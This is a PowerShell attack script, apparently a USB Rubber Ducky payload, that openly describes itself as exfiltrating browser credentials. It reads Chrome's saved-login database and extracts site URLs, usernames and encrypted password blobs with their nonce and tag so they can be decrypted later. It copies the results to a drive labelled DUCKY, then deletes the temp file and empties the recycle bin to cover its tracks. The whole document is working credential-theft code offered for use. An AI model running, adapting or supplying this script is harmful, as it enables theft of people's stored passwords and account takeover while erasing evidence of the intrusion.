#################################################################
# Title        : Get-Chrome-Passwords Cuzz                      #
# Author       : Deez Nuts                                      #
# Version      : 1.0                                            #
# Category     : Credentials, Decryption                        #
# Target       : Windows 10                                     #
# Mode         : CLI                                            #
# Props        : Deez Nuts, NUuugaahhhhhh                       #
#                                                               # 
#################################################################

<#
.SYNOPSIS
    This script exfiltrates credentials from the browser.
.DESCRIPTION 
    Checks and saves the credentials from the Chrome browser in an encrypted format for later decryption.
.Link
    https://developers.dropbox.com/oauth-guide    # Guide for setting up your DropBox for uploads
#>

$FileName = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)_User-Creds.txt"

# Path to Chrome's user data and Local State files
$chromeDataPath = "$env:LOCALAPPDATA\Google\Chrome\User Data"
$localStatePath = "$chromeDataPath\Local State"

# Check if the required files exist
if (-Not (Test-Path $localStatePath)) {
    exit
}

# Open the SQLite database for Login Data
$loginDataPath = "$chromeDataPath\Default\Login Data"
if (-Not (Test-Path $loginDataPath)) {
    exit
}

# Add SQLite Interop for querying SQLite database
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class SQLiteInterop {
    [DllImport("winsqlite3.dll", EntryPoint = "sqlite3_open")]
    public static extern int Open(string filename, out IntPtr db);
    [DllImport("winsqlite3.dll", EntryPoint = "sqlite3_prepare_v2")]
    public static extern int Prepare(IntPtr db, string sql, int nBytes, out IntPtr stmt, IntPtr pzTail);
    [DllImport("winsqlite3.dll", EntryPoint = "sqlite3_step")]
    public static extern int Step(IntPtr stmt);
    [DllImport("winsqlite3.dll", EntryPoint = "sqlite3_column_text")]
    public static extern IntPtr ColumnText(IntPtr stmt, int col);
    [DllImport("winsqlite3.dll", EntryPoint = "sqlite3_column_blob")]
    public static extern IntPtr ColumnBlob(IntPtr stmt, int col);
    [DllImport("winsqlite3.dll", EntryPoint = "sqlite3_column_bytes")]
    public static extern int ColumnBytes(IntPtr stmt, int col);
    [DllImport("winsqlite3.dll", EntryPoint = "sqlite3_finalize")]
    public static extern int Finalize(IntPtr stmt);
    [DllImport("winsqlite3.dll", EntryPoint = "sqlite3_close")]
    public static extern int Close(IntPtr db);
}
"@

# Open the database
[IntPtr]$db = [IntPtr]::Zero
if ([SQLiteInterop]::Open($loginDataPath, [ref]$db) -ne 0) {
    exit
}

# Query the database for saved passwords
$query = "SELECT origin_url, username_value, password_value FROM logins"
[IntPtr]$stmt = [IntPtr]::Zero
if ([SQLiteInterop]::Prepare($db, $query, -1, [ref]$stmt, [IntPtr]::Zero) -ne 0) {
    [SQLiteInterop]::Close($db)
    exit
}

# Collect credentials and save encrypted data (no decryption)
$credentials = @()
while ([SQLiteInterop]::Step($stmt) -eq 100) {
    $url = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi([SQLiteInterop]::ColumnText($stmt, 0))
    $username = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi([SQLiteInterop]::ColumnText($stmt, 1))
    $passwordBlob = [SQLiteInterop]::ColumnBlob($stmt, 2)
    $passwordLength = [SQLiteInterop]::ColumnBytes($stmt, 2)
    $passwordEncrypted = [byte[]]::new($passwordLength)
    [System.Runtime.InteropServices.Marshal]::Copy($passwordBlob, $passwordEncrypted, 0, $passwordLength)

    # Save URL, username, encrypted password, nonce, and tag without decryption
    $credentials += [PSCustomObject]@{
        URL             = $url
        Username        = $username
        CipherText      = [Convert]::ToBase64String($passwordEncrypted)   # Save encrypted password as base64 string
        Nonce           = [Convert]::ToBase64String($passwordEncrypted[3..14]) # Nonce used in AES-GCM
        Tag             = [Convert]::ToBase64String($passwordEncrypted[($passwordEncrypted.Length - 16)..($passwordEncrypted.Length - 1)]) # Encryption tag
    }
}

# Cleanup
[SQLiteInterop]::Finalize($stmt)
[SQLiteInterop]::Close($db)

# Save the credentials to a file without formatting it as a table
$SourceFilePath = "$env:TMP\$FileName"
$credentials | ForEach-Object {
    "$($_.URL)`t$($_.Username)`t$($_.CipherText)`t$($_.Nonce)`t$($_.Tag)"
} | Out-File -FilePath $SourceFilePath -Force

# Function to find the drive named "DUCKY"
function Get-DuckyDrive {
    $allDrives = Get-WmiObject -Class Win32_LogicalDisk | Where-Object { $_.DriveType -eq 2 -or $_.DriveType -eq 3 }  # 2 = Removable, 3 = Fixed
    foreach ($drive in $allDrives) {
        if ($drive.VolumeName -eq "DUCKY") {
            return $drive.DeviceID
        }
    }
    return $null  # Return null if no drive named "DUCKY" is found
}

# Search for the "DUCKY" drive
$duckyDrive = Get-DuckyDrive
if ($duckyDrive) {
    $TargetFilePath = "$duckyDrive\$FileName"
    Copy-Item -Path $SourceFilePath -Destination $TargetFilePath
}

# Stage 3: Cleanup Traces
# Delete contents of Temp folder
Remove-Item $SourceFilePath -Force -ErrorAction SilentlyContinue

# Deletes contents of recycle bin
Clear-RecycleBin -Force -ErrorAction SilentlyContinue
